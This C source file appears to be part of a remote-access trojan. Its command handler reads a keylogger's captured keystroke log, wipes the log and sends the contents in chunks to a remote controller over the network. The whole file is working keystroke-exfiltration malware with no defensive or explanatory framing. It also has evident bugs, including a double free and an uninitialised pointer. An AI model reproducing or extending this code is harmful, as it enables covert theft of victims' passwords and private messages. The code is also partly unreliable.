#include <windows.h>
#include "types.h"
#include "cmd/commands.h"
#include "net/interface.h"
#include "net/error.h"
#include "keylogger.h"

#define COMMAND_KEYLOGGER_GET_DATA 0xF
#define COMMAND_KEYLOGGER_GET_END 0xE

int command_Keylogger_Get(void)
{
	if(!keylogger_IsRunning)
	{
		if(net_SendCmd((uint8*)" ", 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
		{
			return NET_LOST_CONNECTION;
		}

		return COMMANDS_SUCC;
	}

	uint32 size = keylogger_GetSize();
	uint8 s_size[5];
	s_size[0] = (size) & 0xFF;
	s_size[1] = (size >> 8) & 0xFF;
	s_size[2] = (size >> 16) & 0xFF;
	s_size[3] = (size >> 24) & 0xFF;
	s_size[4] = 0;

	if(net_SendCmd(s_size, 5, COMMANDS_APPROVE) == NET_LOST_CONNECTION)
	{
		return NET_LOST_CONNECTION;
	}

	keylogger_PrepareToRead();
	Sleep(50);

	char* data = malloc(size);
	fseek(flog, 0, SEEK_SET);
	
	if(!fread(data, 1, size, flog))
	{
		keylogger_Clear();
		free(data);

		if(net_SendCmd((uint8*)" ", 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
		{
			free(data);

			return NET_LOST_CONNECTION;
		}

		return COMMANDS_SUCC;
	}

	keylogger_Clear();

	if(net_SendCmd((uint8*)" ", 1, COMMANDS_APPROVE) == NET_LOST_CONNECTION)
	{
		free(data);

		return NET_LOST_CONNECTION;
	}
	
	uint32 i;
	uint32 bufferIndex = 0;
	uint8 buffer[NET_BUFFSIE_FOR_FILE];
	memset(buffer, 0, NET_BUFFSIE_FOR_FILE);
	uint8 *rmsg;

	for(i = 0; i != size; i++)
	{
		if(bufferIndex >= NET_BUFFSIE_FOR_FILE)
		{
			if(net_SendCmd(buffer, NET_BUFFSIE_FOR_FILE, COMMAND_KEYLOGGER_GET_DATA) == NET_LOST_CONNECTION)
			{
				free(data);

				if(rmsg)
				{
					free(rmsg);
				}

				return NET_LOST_CONNECTION;
			}

			if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
			{
				free(data);
				free(rmsg);

				return NET_LOST_CONNECTION;
			}

			memset(buffer, 0, NET_BUFFSIE_FOR_FILE);
			bufferIndex = 0;
			free(rmsg);
		}

		buffer[bufferIndex++] = data[i];
	}

	free(data);

	if(bufferIndex != 0 || bufferIndex <= NET_BUFFSIE_FOR_FILE)
	{	
		if(net_SendCmd(buffer, bufferIndex, COMMAND_KEYLOGGER_GET_DATA) == NET_LOST_CONNECTION)
		{
			free(rmsg);

			return NET_LOST_CONNECTION;
		}

		if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
		{
			free(rmsg);

			return NET_LOST_CONNECTION;
		}

		free(rmsg);
	}

	if(net_SendCmd((uint8*)" ", 1, COMMAND_KEYLOGGER_GET_END) == NET_LOST_CONNECTION)
	{
		return NET_LOST_CONNECTION;
	}

	return COMMANDS_SUCC;
}